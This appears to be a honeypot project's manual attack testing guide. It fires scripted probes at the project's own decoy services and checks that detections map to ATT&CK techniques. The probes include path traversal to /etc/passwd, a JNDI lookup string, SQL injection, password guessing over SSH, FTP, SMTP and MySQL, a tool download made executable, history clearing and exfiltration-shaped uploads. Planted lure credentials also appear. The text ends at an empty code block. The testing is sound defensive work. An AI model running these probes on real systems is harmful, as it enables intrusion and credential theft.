# Attack Testing Guide

This guide is only for live/manual verification on the VM at `146.169.44.23`. Use host-facing browser or terminal traffic; avoid `docker run --network ...` for attacker traffic because it creates Docker bridge source IPs.

## 1. Start

```bash
# Clear previous bindings, routes, observations, and runtime containers.
./scripts/reset_enterprise_runtime.sh

# Start the public portal, controller/orchestrator services, dashboard, forwarders, and enterprise compose slice.
./scripts/start_enterprise_stack.sh
```

Optional local tunnel for browser testing:

The tunnel maps local browser ports to the VM-facing services: public portal (`18000`), dashboard (`18090`), internal HTTP assets (`18180`, `18089`, `18082`, `18085`, `18443`), protocol assets (`19419`, `13306`, `16379`, `12121`, `12222`, `12323`, `12525`), high-interaction ports (`11445`, `11433`, `12122`, `19999`), and admin jumpbox (`10222`).

```bash
# Keep this terminal open while browsing from your laptop.
ssh -N \
  -L 127.0.0.1:18000:146.169.44.23:8080 \
  -L 127.0.0.1:18090:146.169.44.23:8090 \
  -L 127.0.0.1:18180:146.169.44.23:18080 \
  -L 127.0.0.1:18089:146.169.44.23:18081 \
  -L 127.0.0.1:18082:146.169.44.23:18082 \
  -L 127.0.0.1:18085:146.169.44.23:18085 \
  -L 127.0.0.1:18443:146.169.44.23:18443 \
  -L 127.0.0.1:19419:146.169.44.23:19418 \
  -L 127.0.0.1:13306:146.169.44.23:13306 \
  -L 127.0.0.1:16379:146.169.44.23:16379 \
  -L 127.0.0.1:12121:146.169.44.23:12121 \
  -L 127.0.0.1:12222:146.169.44.23:12222 \
  -L 127.0.0.1:12323:146.169.44.23:12323 \
  -L 127.0.0.1:12525:146.169.44.23:2525 \
  -L 127.0.0.1:11445:146.169.44.23:1445 \
  -L 127.0.0.1:11433:146.169.44.23:11433 \
  -L 127.0.0.1:12122:146.169.44.23:12122 \
  -L 127.0.0.1:19999:146.169.44.23:19999 \
  -L 127.0.0.1:10222:146.169.44.23:10222 \
  vm
```

Open browser pages with `127.0.0.1` instead of `localhost`, for example `http://127.0.0.1:18180/`, so the browser does not choose the IPv6 localhost path.

Optional route-level engineering check:

Use this only when you want to check that the reveal pipeline can open the expected fixed ports. It replays scripted profiles, asks the controller what route would be exposed, applies the orchestrator action, and verifies that `data/runtime/asset_gateway_routes.json` contains the expected `asset_id` + public port route. It is not a behaviour evaluation: it does not simulate attacker commands, browser clicks, protocol probes, or Sigma-to-technique coverage. Those are covered by the manual probes below and the entrypoint coverage tests.

```bash
# Replay route scenarios and apply the selected controller actions to the live runtime.
.venv/bin/python scripts/evaluation/reveal_port_simulation.py \
  --mode live-apply \
  --scenario-file tests/fixtures/reveal_port_scenarios.json \
  --output data/runtime/reveal_port_simulation_report.json

# Print the summary plus per-scenario selected assets and route checks.
jq '.summary, .scenarios[] | {scenario_id, ok, selected_assets, expected_routes, actual_routes, failure_reason}' \
  data/runtime/reveal_port_simulation_report.json
```

Expected: each passed scenario has the selected asset and the exact asset-gateway route. A failed runtime is reported explicitly, not silently skipped.

This evaluation creates routes for scripted attacker keys such as `198.51.100.x`. To probe the fixed ports from this VM shell or browser, still run section 4 with the real source IP key, normally `146.169.44.23`.

Optional configuration variant live checks:

Use this after the enterprise stack is running when you want to prove that A.2 configuration variants are real attacker-visible changes. The helper below calls the private control-plane API from Docker, but every probe command uses the attacker-facing host/port. Reconnect after applying a variant; existing TCP sessions are not preserved. The `tests T...` comments name the ATT&CK techniques expected from that exact probe; a visible note may test a narrower technique than the variant's full follow-up intent.

```bash
# Pick the latest attacker key seen by the public portal; fall back to the VM public IP.
TEST_ATTACKER_KEY="$(
  curl -s "http://146.169.44.23:8090/api/summary" |
    jq -r '.recent_entrypoint_observations | .[0].attacker_key // "146.169.44.23"'
)"
```

HTTP content variants:

```bash
# Apply the portal service-directory configuration for this attacker binding.
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh internal-portal portal-api-directory-links

# tests T1046/T1018: service/API directory access.
curl -fsS "http://146.169.44.23:18080/api/openapi-summary.json" | grep -F "Operations Directory API"

# tests T1046/T1018: runbook-host inventory interest.
curl -fsS "http://146.169.44.23:18080/runbooks/service-directory.md" | grep -F "service-directory"

# Apply the portal admin-link configuration for this attacker binding.
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh internal-portal portal-admin-console-link

# tests T1213: reading the per-binding admin-console runbook.
curl -fsS "http://146.169.44.23:18080/runbooks/admin-console-access.md" | grep -F "Maintenance Access"

# Apply the finance archive-index configuration.
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh finance-share finance-backup-archive-index

# tests T1005: finance archive index access.
curl -fsS "http://146.169.44.23:18082/finance/archive/2024/customer-export-index.csv" | grep -F "customer-export"

# tests T1005: finance archive manifest access.
curl -fsS "http://146.169.44.23:18082/finance/archive/2024/archive-manifest.txt" | grep -F "Finance archive manifest"

# Apply the finance password-rotation note configuration.
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh finance-share finance-password-rotation-clue

# tests T1213: reading a credential-process note; actual credential reuse is tested by follow-up login probes.
curl -fsS "http://146.169.44.23:18082/finance/archive/2024/password-rotation-note.txt" | grep -F "password rotation"

# Apply the web-admin login-surface configuration.
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh web-admin-console web-admin-login-surface

# visibility only: page load confirms the login page exists; the POST below tests T1110.
curl -fsS "http://146.169.44.23:18081/login/" | grep -F "Northbridge Admin Console"

# tests T1110: failed admin-console login attempt.
curl -fsS -X POST "http://146.169.44.23:18081/login" -d "username=admin&password=x" >/dev/null || true

# Apply the web-admin discovery endpoint configuration.
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh web-admin-console web-admin-discovery-endpoints

# tests T1518: software/inventory discovery.
curl -fsS "http://146.169.44.23:18081/api/inventory.json" | grep -F "svc-admin-console"

# tests T1057: process discovery.
curl -fsS "http://146.169.44.23:18081/api/processes.json" | grep -F "admin-console"

# tests T1069: permission-group discovery.
curl -fsS "http://146.169.44.23:18081/api/groups.json" | grep -F "platform"

# tests T1082: system/container resource discovery.
curl -fsS "http://146.169.44.23:18081/api/container-resources.json" | grep -F "ops-prod-a"

# Apply the VPN profile/login-clue configuration.
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh vpn-appliance vpn-profile-login-clue

# tests T1133: external remote-service profile clue.
curl -fsS "http://146.169.44.23:18443/policy/login-clue.txt" | grep -F "Remote access profile"

# tests T1133: contractor VPN profile download.
curl -fsS "http://146.169.44.23:18443/download/contractor-profile.ovpn" | grep -F "auth-user-pass"

# Apply the VPN route-policy note configuration.
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh vpn-appliance vpn-route-policy-notes

# tests T1016: route-policy note access.
curl -fsS "http://146.169.44.23:18443/policy/route-policy-notes.txt" | grep -F "Split-tunnel"

# tests T1572: tunnel route list access.
curl -fsS "http://146.169.44.23:18443/policy/tunnel-routes.txt" | grep -F "Split tunnel"

# Apply the malware-sink downloader staging configuration.
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh malware-sink malware-downloader-staging-directory

# tests T1608: downloader/resource staging index access.
curl -fsS "http://146.169.44.23:18085/staging/downloader-index.txt" | grep -F "endpoint package"

# tests T1105: staged downloader binary request.
curl -fsS "http://146.169.44.23:18085/downloads/agent-update.bin" >/dev/null

# Apply the malware-sink upload/drop endpoint configuration.
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh malware-sink malware-upload-drop-endpoint

# visibility only: drop-endpoint note read; the POST below tests T1567.
curl -fsS "http://146.169.44.23:18085/upload/drop-endpoint.txt" | grep -F "Upload intake endpoint"

# tests T1567: upload/exfil-shaped POST to the exposed drop endpoint.
curl -fsS -X POST "http://146.169.44.23:18085/upload/" -d "filename=finance-drop.zip" >/dev/null || true
```

Protocol target-runtime variants:

```bash
# Swap Git from base canary to the seeded Git daemon.
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh git-internal git-seeded-repository-backend

# tests T1046/T1213: Git service and repository access.
timeout 8s git ls-remote git://146.169.44.23:19418/infra-deploy.git | head

# Swap Redis to the seeded keyspace backend.
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh redis-cache redis-seeded-keyspace-backend

# tests T1046/T1213: Redis keyspace discovery.
printf "KEYS *\r\n" | nc -w 3 146.169.44.23 16379 | grep -F "session:portal.reader"

# tests T1046/T1005: Redis seeded value read.
printf "GET session:portal.reader\r\n" | nc -w 3 146.169.44.23 16379 | grep -F "nbp_reader"

# Swap FTP to the configured archive banner backend.
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh ftp-archive ftp-archive-review-banner

# tests T1110/T1021: FTP USER probe; banner visibility is checked by grep.
printf "USER archive\r\n" | nc -w 3 146.169.44.23 12121 | grep -F "archive-ftpd.internal.local"

# tests T1110/T1021/T1039: FTP login and archive retrieval attempt.
printf "USER anonymous\r\nPASS anonymous\r\nRETR finance-drop.zip\r\nQUIT\r\n" | nc -w 4 146.169.44.23 12121 || true

# Swap ops-db to the configured MySQL-compatible banner backend.
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh ops-db ops-db-schema-banner-backend

# visibility check: MySQL handshake is visible without using the Docker bridge.
python3 - <<'PY'
import socket
s = socket.create_connection(("146.169.44.23", 13306), timeout=5)
print(s.recv(512).decode("latin1", errors="replace"))
s.close()
PY

# tests T1110: MySQL login attempt against the configured database surface.
python3 - <<'PY'
import socket
import struct
username = b"backup_reader"
password = b"WrongPassword"
with socket.create_connection(("146.169.44.23", 13306), timeout=5) as sock:
    sock.recv(4096)
    capabilities = 0x00000001 | 0x00000200 | 0x00008000 | 0x00080000
    payload = struct.pack("<IIB23s", capabilities, 16777216, 33, b"\0" * 23)
    payload += username + b"\0" + bytes([len(password)]) + password + b"mysql_native_password\0"
    sock.sendall(struct.pack("<I", len(payload))[:3] + b"\x01" + payload)
    print(sock.recv(4096).decode("utf-8", errors="replace"))
PY

# Swap the SSH canary to Cowrie.
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh ssh-canary ssh-cowrie-jumpbox-profile

# visibility check: route accepts a client connection; failure is expected because BatchMode avoids password entry.
ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 12222 root@146.169.44.23 true </dev/null || true

# tests T1021.004/T1110: one SSH password attempt.
tmpask="$(mktemp)"; printf '#!/bin/sh\necho wrongpass\n' > "$tmpask"; chmod +x "$tmpask"; DISPLAY=:0 SSH_ASKPASS="$tmpask" SSH_ASKPASS_REQUIRE=force setsid ssh -o NumberOfPasswordPrompts=1 -o PubkeyAuthentication=no -o PreferredAuthentications=password -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 12222 root@146.169.44.23 true </dev/null || true; rm -f "$tmpask"

# Swap Telnet to the legacy console prompt backend.
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh legacy-telnet legacy-telnet-console-prompt

# tests T1021/T1110: configured legacy console login-path probe.
printf "admin\r\n" | nc -w 3 146.169.44.23 12323 | grep -F "Northbridge legacy console"

# Swap SMTP to Mailoney.
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh mail-relay mailoney-auth-relay-backend

# tests T1046: SMTP banner/relay interaction.
printf "EHLO tester\r\nQUIT\r\n" | nc -w 3 146.169.44.23 2525 | grep -F "Python SMTP proxy"

# tests T1087.003/T1110: SMTP recipient probing and AUTH attempt.
printf "EHLO tester\r\nVRFY finance\r\nAUTH LOGIN\r\nYWRtaW4=\r\nV3JvbmdQYXNz\r\nQUIT\r\n" | nc -w 4 146.169.44.23 2525 || true

# Swap the admin jumpbox to its Cowrie operator profile.
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh admin-jumpbox jumpbox-cowrie-operator-profile

# visibility check: jumpbox SSH route accepts a client connection.
ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 10222 root@146.169.44.23 true </dev/null || true
```

High-interaction target variants:

```bash
# Apply the Dionaea-to-Glutton adjacent HTTP capture route.
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh dionaea-capture dionaea-to-glutton-http-capture

# tests T1190/T1105 through generic high-interaction capture.
curl -i "http://146.169.44.23:19999/config-check" | head

# Apply the malware-sink same-port Dionaea upgrade.
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh malware-sink malware-dionaea-same-port-upgrade

# tests T1041/T1105/T1190/T1204.002 when latest 18085 route points to Dionaea.
curl -i "http://146.169.44.23:18085/downloads/agent-update.bin" | head

# Apply the malware-sink adjacent generic capture listener.
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh malware-sink malware-honeytrap-generic-listener

# tests T1046/T1105/T1190 through generic TCP capture.
printf "payload upload test\r\n" | nc -w 3 146.169.44.23 19999 || true

# Swap generic capture to Wordpot.
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh honeytrap-generic honeytrap-wordpot-web-capture

# tests T1190/T1046: WordPress-like exploit/probe surface.
curl -i "http://146.169.44.23:19999/wp-login.php" | grep -F "Wordpress"
```

Expected: each `apply_configuration_variant_for_test.sh` response shows a route update and either `configured_runtime: true` for same-port swaps or a newly exposed target asset. Each probe returns the expected visible string or successful protocol handshake within a reconnect.

## 2. Public Signals

Run this from the same terminal/browser source IP that will later test internal ports:

```bash
# Baseline page load; verifies public portal access logging.
curl -i "http://146.169.44.23:8080/"

# Public credential/config breadcrumb; should trigger credential/config discovery evidence.
curl -i "http://146.169.44.23:8080/.env.old"

# Public password-file breadcrumb; should strengthen credential-access evidence.
curl -i "http://146.169.44.23:8080/backup/passwords_internal.txt"

# Public backup breadcrumb; should trigger backup/archive discovery evidence.
curl -i "http://146.169.44.23:8080/backup/db_backup_2024.sql.bak"

# Source-map breadcrumb; should support developer/Git-path reveal decisions.
curl -i "http://146.169.44.23:8080/assets/app.js.map"

# Admin path probe; should support admin-console reveal decisions.
curl -i "http://146.169.44.23:8080/admin"

# Exposed Git config probe; should support Git/developer surface interest.
curl -i "http://146.169.44.23:8080/.git/config"

# PHP info probe; scanner/discovery signal.
curl -i "http://146.169.44.23:8080/phpinfo.php"

# Failed login attempt; should map to credential/login probing evidence.
curl -i -X POST "http://146.169.44.23:8080/login" -d "username=admin&password=WrongPassword"

# SQL injection scanner probe; should map to exploit/scanner evidence.
curl -i -A "sqlmap/1.8 live-test" "http://146.169.44.23:8080/api/search?q=1%20union%20select%201"

# Internal API breadcrumb from the public surface; supports portal/admin dependency markers.
curl -i "http://146.169.44.23:8080/internal-api/status"

# Local file inclusion/path traversal probe.
curl -i "http://146.169.44.23:8080/view?file=../../../../etc/passwd"

# JNDI-style exploit probe.
curl -i "http://146.169.44.23:8080/lookup?x=%24%7Bjndi%3Aldap%3A%2F%2Fexample.test%2Fa%7D"

# Give forwarders and the profiler a moment to ingest observations.
sleep 2

# Confirm public observations became profiler evidence and updated the attacker profile.
curl -s "http://146.169.44.23:8090/api/summary" | jq '{recent_entrypoint_observations: [.recent_entrypoint_observations[] | {attacker_key, path, matched_rules, indicators, profiler_evidence_ids}], attackers: [.attackers[] | {attacker_key, recent_tactics, recent_techniques, public_http_evidence, unlocked_assets}]}'
```

Expected: suspicious public paths have `matched_rules`, non-empty `profiler_evidence_ids`, and the attacker profile shows HTTP evidence.

## 3. Cowrie SSH Smoke

Connect to Cowrie:

```bash
# Open an interactive Cowrie SSH session through the public SSH honeypot port.
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 root@146.169.44.23
```

Type these inside Cowrie:

```bash
# User discovery.
whoami

# User/group discovery.
id

# Host/system discovery.
uname -a

# Account-file discovery.
cat /etc/passwd

# Tool transfer attempt against the malware sink route.
curl http://146.169.44.23:18085/downloads/agent-update.bin -o /tmp/agent-update.bin

# Permission change on downloaded tool.
chmod +x /tmp/agent-update.bin

# Indicator removal.
history -c

# End the Cowrie session.
exit
```

Expected minimum mappings:

| Command | Expected technique |
| --- | --- |
| `whoami` | `T1033` |
| `id` | `T1033`, `T1087.001` |
| `uname -a` | `T1033`, `T1082` |
| `cat /etc/passwd` | `T1087.001` |
| `curl http://146.169.44.23:18085/downloads/agent-update.bin -o /tmp/agent-update.bin` | `T1105` |
| `chmod +x /tmp/agent-update.bin` | `T1222.002` |
| `history -c` | `T1070.003` |

```bash
# Wait for Cowrie forwarder and profiler ingestion.
sleep 2

# Confirm Cowrie observations and mapped techniques reached the dashboard/profile.
curl -s "http://146.169.44.23:8090/api/summary" | jq '{cowrie: [.recent_cowrie_observations[] | {eventid, attacker_key, command, profiler_evidence_ids}], attackers: [.attackers[] | {attacker_key, commands, recent_tactics, recent_techniques, unlocked_assets}]}'
```

## 4. Unlock Fixed-Port MVP Assets

This is the manual test-mode path. It force-unlocks fixed-port MVP assets through the normal orchestrator API for the observed attacker key. High-interaction assets are validated separately because they need their runtime backend and telemetry forwarder to be reachable.

```bash
# Reuse the latest public-portal attacker key so routes match this source IP.
TEST_ATTACKER_KEY="$(
  curl -s "http://146.169.44.23:8090/api/summary" |
    jq -r '.recent_entrypoint_observations | .[0].attacker_key // "146.169.44.23"'
)"

# Print the chosen attacker key for sanity.
echo "$TEST_ATTACKER_KEY"

# Force-unlock the standard fixed-port internal assets for this attacker.
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/unlock_internal_assets_for_test.sh

# Wait for orchestrator route writes and backend startup.
sleep 3

# Verify routes exist for this exact attacker key.
jq --arg ip "$TEST_ATTACKER_KEY" '[.routes[] | select(.attacker_key == $ip) | .asset_id] | unique' data/runtime/asset_gateway_routes.json
```

Expected: the route list includes `internal-portal`, `finance-share`, `git-internal`, `ops-db`, `redis-cache`, `web-admin-console`, `ftp-archive`, `ssh-canary`, `legacy-telnet`, `mail-relay`, `vpn-appliance`, and `malware-sink`. Extra naturally unlocked assets may also appear if the adaptive loop already acted.

## 5. Full Internal Smoke

Run this from the same source IP used above:

```bash
# static HTTP assets
# Internal portal landing page; proves the portal route is open.
curl -i "http://146.169.44.23:18080/" || true

# Invalid internal-portal credential reuse; should produce failed login evidence.
curl -i -X POST "http://146.169.44.23:18080/session" -d "username=portal.reader&token=WrongToken" || true

# Valid internal-portal credential reuse; should produce valid-token evidence.
curl -i -X POST "http://146.169.44.23:18080/session" -d "username=portal.reader&token=nbp_reader_2026_04_window" || true

# Web admin landing page.
curl -i "http://146.169.44.23:18081/" || true

# Web admin status endpoint discovery.
curl -i "http://146.169.44.23:18081/api/status" || true

# Finance share landing page.
curl -i "http://146.169.44.23:18082/" || true

# Finance archive file access.
curl -i "http://146.169.44.23:18082/finance/archive/2024/budget-q4-review.xlsx" || true

# Finance staged archive access.
curl -i "http://146.169.44.23:18082/finance/archive/2024/payroll-archive.zip" || true

# Finance backup file access.
curl -i "http://146.169.44.23:18082/exports/db_backup_2024.sql.bak" || true

# VPN landing page.
curl -i "http://146.169.44.23:18443/" || true

# VPN backup request without credentials.
curl -i "http://146.169.44.23:18443/backup/ra-config-2026-04.bak" || true

# VPN backup request with planted contractor credential.
curl -i -u "contractor.ops:RemoteAccess-0426" "http://146.169.44.23:18443/backup/ra-config-2026-04.bak" || true

# VPN profile download with planted contractor credential.
curl -i -u "contractor.ops:RemoteAccess-0426" "http://146.169.44.23:18443/download/contractor-profile.ovpn" || true

# Malware sink landing page.
curl -i "http://146.169.44.23:18085/" || true

# Malware/tool download request.
curl -i "http://146.169.44.23:18085/downloads/agent-update.bin" || true

# Malware upload/drop endpoint note.
curl -i "http://146.169.44.23:18085/upload/README.txt" || true

# OpenCanary / protocol assets
# Git repository discovery.
timeout 8s git ls-remote git://146.169.44.23:19418/infra-deploy.git || true

# Redis service discovery.
printf "INFO\r\n" | nc -w 2 146.169.44.23 16379 || true

# Redis key enumeration.
printf "KEYS *\r\n" | nc -w 2 146.169.44.23 16379 || true

# Redis config/credential-oriented probing.
printf "CONFIG GET *\r\n" | nc -w 2 146.169.44.23 16379 || true

# FTP login plus file retrieval.
printf "USER anonymous\r\nPASS anonymous\r\nRETR finance-drop.zip\r\nQUIT\r\n" | nc -w 4 146.169.44.23 12121 || true

# FTP upload/exfiltration-shaped attempt.
printf "USER anonymous\r\nPASS anonymous\r\nSTOR finance-drop.zip\r\nQUIT\r\n" | nc -w 4 146.169.44.23 12121 || true

# SSH credential attempt against the canary.
timeout 8s ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 12222 root@146.169.44.23 true </dev/null || true

# Telnet login prompt interaction.
{ sleep 1; printf "admin\r\n"; sleep 1; printf "admin123\r\n"; sleep 1; } | nc -w 8 146.169.44.23 12323 || true

# SMTP discovery, account probing, and auth attempt.
printf "EHLO tester\r\nVRFY admin\r\nAUTH LOGIN\r\nYWRtaW4=\r\nV3JvbmdQYXNz\r\nQUIT\r\n" | nc -w 3 146.169.44.23 2525 || true

# MySQL-compatible login packet; should create DB credential/login telemetry.
python3 - <<'PY'
import socket
import struct

host = "146.169.44.23"
port = 13306
username = b"backup_reader"
password = b"WrongPassword"

try:
    with socket.create_connection((host, port), timeout=5) as sock:
        sock.recv(4096)
        capabilities = 0x00000001 | 0x00000200 | 0x00008000 | 0x00080000
        payload = struct.pack("<IIB23s", capabilities, 16777216, 33, b"\0" * 23)
        payload += username + b"\0" + bytes([len(password)]) + password + b"mysql_native_password\0"
        sock.sendall(struct.pack("<I", len(payload))[:3] + b"\x01" + payload)
        print(sock.recv(4096).decode("utf-8", errors="replace"))
except OSError as exc:
    print(f"MySQL probe failed: {exc}")
PY
```

Check:

```bash
# Let internal HTTP/protocol forwarders and profiler process events.
sleep 3

# Inspect routes, recent protocol observations, and the resulting attacker profile.
curl -s "http://146.169.44.23:8090/api/summary" | jq '{asset_gateway_routes, recent_opencanary_observations, attackers: [.attackers[] | {attacker_key, recent_tactics, recent_techniques, internal_http_evidence, unlocked_assets}]}'

# Require observed telemetry for every fixed-port asset touched in this smoke.
.venv/bin/python scripts/validation/asset_telemetry.py \
  --asset-id internal-portal \
  --asset-id finance-share \
  --asset-id git-internal \
  --asset-id ops-db \
  --asset-id redis-cache \
  --asset-id web-admin-console \
  --asset-id ftp-archive \
  --asset-id ssh-canary \
  --asset-id legacy-telnet \
  --asset-id mail-relay \
  --asset-id vpn-appliance \
  --asset-id malware-sink \
  --require-observed
```

Expected: static HTTP assets produce internal HTTP evidence; Git/MySQL/Redis/FTP/SSH/Telnet/SMTP produce `recent_opencanary_observations` and update attacker tactics/techniques.

## 6. High-Interaction And Capture Runtime Smoke

Use this after the fixed-port smoke when you want to verify upgraded capture backends. These commands force-unlock Dionaea plus the generic TCP capture asset for the same attacker key, then probe their gateway-managed ports.

```bash
# Reuse the latest attacker key so high-interaction routes match this source IP.
TEST_ATTACKER_KEY="$(
  curl -s "http://146.169.44.23:8090/api/summary" |
    jq -r '.recent_entrypoint_observations | .[0].attacker_key // "146.169.44.23"'
)"

# Force-unlock Dionaea and generic capture backends.
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/unlock_internal_assets_for_test.sh --assets dionaea-capture,honeytrap-generic

# Give Docker backends and sidecar forwarders time to start.
sleep 10

# Verify gateway routes for the two high-interaction assets.
jq --arg ip "$TEST_ATTACKER_KEY" '[.routes[] | select(.attacker_key == $ip and (.asset_id == "dionaea-capture" or .asset_id == "honeytrap-generic")) | {asset_id, public_port, backend_host, backend_port}]' data/runtime/asset_gateway_routes.json
```

Probe the high-interaction routes:

```bash
# Dionaea HTTP/SMB/MSSQL/FTP-facing ports
# Dionaea HTTP payload/download-like request.
curl -i "http://146.169.44.23:18085/downloads/agent-update.bin" || true

# Dionaea SMB-facing probe.
printf "\x00\x00\x00\x90" | nc -w 3 146.169.44.23 1445 || true

# Dionaea MSSQL-facing probe.
printf "\x12\x01\x00\x34" | nc -w 3 146.169.44.23 11433 || true

# Dionaea FTP-facing login probe.
printf "USER anonymous\r\nPASS anonymous\r\nQUIT\r\n" | nc -w 3 146.169.44.23 12122 || true

# Generic TCP capture port
# Generic capture payload/probe.
printf "payload upload test\r\n" | nc -w 3 146.169.44.23 19999 || true
```

Check:

```bash
# Let high-interaction forwarders ingest backend/gateway probe events.
sleep 5

# Check dashboard-facing high-interaction observations and profile updates.
curl -s "http://146.169.44.23:8090/api/summary" | jq '{recent_high_interaction_observations, high_interaction_events: .event_counts.high_interaction, attackers: [.attackers[] | {attacker_key, recent_tactics, recent_techniques, unlocked_assets}]}'

# Require observed telemetry for the high-interaction assets.
.venv/bin/python scripts/validation/asset_telemetry.py --asset-id dionaea-capture --asset-id honeytrap-generic --require-observed
```

Expected: the selected assets have runtime records, asset-gateway routes, dashboard running state, and either `recent_high_interaction_observations` or raw high-interaction/internal HTTP telemetry. If a runtime fails, the validation report should show the failed asset instead of silently passing.

## 7. Manual Technique Coverage Smoke

Run the HTTP, protocol, and Cowrie blocks after section 4 and before section 6 if you want a manual smoke that touches every catalog-covered technique at least once. The Dionaea upgrade reuses `18085`, so the static `malware-sink` paths must be touched before the latest route on that port is changed to `dionaea-capture`. After those blocks, run section 6, then come back for the high-interaction and generic capture block plus the final check.

Set the target once:

```bash
# Public VM host used by all probes in this section.
TARGET="146.169.44.23"

# Dashboard/API endpoint used for final profile checks.
DASHBOARD="http://${TARGET}:8090"
```

HTTP surfaces:

```bash
# Internal portal, admin, VPN, finance, and malware sink HTTP paths
curl -i "http://${TARGET}:18080/directory/hosts.csv" || true                         # T1018
curl -i -X POST "http://${TARGET}:18080/session" -d "username=portal.reader&token=nbp_reader_2026_04_window&auth_result=success" || true  # T1021, T1078
curl -i "http://${TARGET}:18081/api/processes.json" || true                         # T1057
curl -i "http://${TARGET}:18081/api/groups.json" || true                            # T1069
curl -i "http://${TARGET}:18081/api/container-resources.json" || true               # T1082
curl -i "http://${TARGET}:18081/api/inventory.json" || true                         # T1518
curl -i -X POST "http://${TARGET}:18081/login" -d "username=admin&password=x" || true # T1110
curl -i "http://${TARGET}:18082/finance/archive/2024/payroll-archive.zip" || true    # T1005
curl -i "http://${TARGET}:18085/downloads/agent-update.bin" || true                 # T1105
curl -i "http://${TARGET}:18085/staging/archive-plan.txt" || true                   # T1074
curl -i "http://${TARGET}:18085/staging/manifest.json" || true                      # T1608
curl -i -X POST "http://${TARGET}:18085/upload/" -d "filename=finance-drop.zip" || true # T1567
curl -i "http://${TARGET}:18443/download/contractor-profile.ovpn" || true           # T1133
curl -i "http://${TARGET}:18443/policy/tunnel-routes.txt" || true                   # T1572
```

Protocol surfaces:

```bash
# Git, Redis, FTP, SSH, Telnet, SMTP, and MySQL-facing lures
timeout 8s git ls-remote "git://${TARGET}:19418/infra-deploy.git" || true            # T1213
printf "INFO\r\n" | nc -w 2 "$TARGET" 16379 || true                                  # T1046
printf "KEYS *\r\n" | nc -w 2 "$TARGET" 16379 || true                                # T1213
printf "GET session:portal.reader\r\n" | nc -w 2 "$TARGET" 16379 || true              # T1005
printf "CONFIG GET *\r\n" | nc -w 2 "$TARGET" 16379 || true                          # T1552.001
printf "USER anonymous\r\nPASS anonymous\r\nRETR finance-drop.zip\r\nQUIT\r\n" | nc -w 4 "$TARGET" 12121 || true # T1021, T1039, T1110
printf "USER anonymous\r\nPASS anonymous\r\nSTOR finance-drop.zip\r\nQUIT\r\n" | nc -w 4 "$TARGET" 12121 || true # T1567.002
tmpask="$(mktemp)"; printf '#!/bin/sh\necho wrongpass\n' > "$tmpask"; chmod +x "$tmpask"; DISPLAY=:0 SSH_ASKPASS="$tmpask" SSH_ASKPASS_REQUIRE=force setsid ssh -o NumberOfPasswordPrompts=1 -o PubkeyAuthentication=no -o PreferredAuthentications=password -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 12222 root@"$TARGET" true </dev/null || true; rm -f "$tmpask" # T1021.004, T1110
{ sleep 1; printf "admin\r\n"; sleep 1; printf "admin123\r\n"; sleep 1; } | nc -w 8 "$TARGET" 12323 || true # T1021, T1110
printf "EHLO tester\r\nVRFY finance\r\nAUTH LOGIN\r\nYWRtaW4=\r\nV3JvbmdQYXNz\r\nQUIT\r\n" | nc -w 4 "$TARGET" 2525 || true # T1046, T1087.003, T1110
TARGET="$TARGET" python3 - <<'PY'
import os
import socket
import struct

host = os.environ["TARGET"]
username = b"backup_reader"
password = b"WrongPassword"
try:
    with socket.create_connection((host, 13306), timeout=5) as sock:
        sock.recv(4096)
        capabilities = 0x00000001 | 0x00000200 | 0x00008000 | 0x00080000
        payload = struct.pack("<IIB23s", capabilities, 16777216, 33, b"\0" * 23)
        payload += username + b"\0" + bytes([len(password)]) + password + b"mysql_native_password\0"
        sock.sendall(struct.pack("<I", len(payload))[:3] + b"\x01" + payload)
        print(sock.recv(4096).decode("utf-8", errors="replace"))
except OSError as exc:
    print(f"MySQL probe failed: {exc}")
PY
```

After the static/protocol/Cowrie blocks complete, run section 6 if you have not already done so. Then probe high-interaction and generic capture routes:

```bash
